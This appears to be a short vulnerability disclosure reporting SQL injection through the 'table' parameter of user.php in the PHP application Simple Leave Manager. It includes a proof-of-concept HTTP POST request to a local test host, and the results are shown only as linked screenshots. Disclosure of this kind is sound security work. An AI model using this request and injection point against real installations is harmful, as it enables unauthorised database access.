# Simple Leave Manager has sql injection in user.php

## supplier 
https://code-projects.org/simple-leave-manager-in-php-with-source-code/
## Vulnerability file
user.php

## describe

**Code analysis**   

In the user.php file of Simple Leave Manager, theuser table parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/0d0d3636-8a47-4eb0-a69c-e835a06ad493.png)


## POC

```
POST /leave/user.php HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 79
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/leave/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=3kjl5a441f8jf2fprb2b9k3h7v
Connection: close

login-type=staff&table=employee&page=dashboard.php&username=1&password=1&login=
```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/591ff4dd-1e1d-44bc-862b-934af4d1fbce.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/22c7f983-a52a-4dbf-a741-506fe5215e32.png)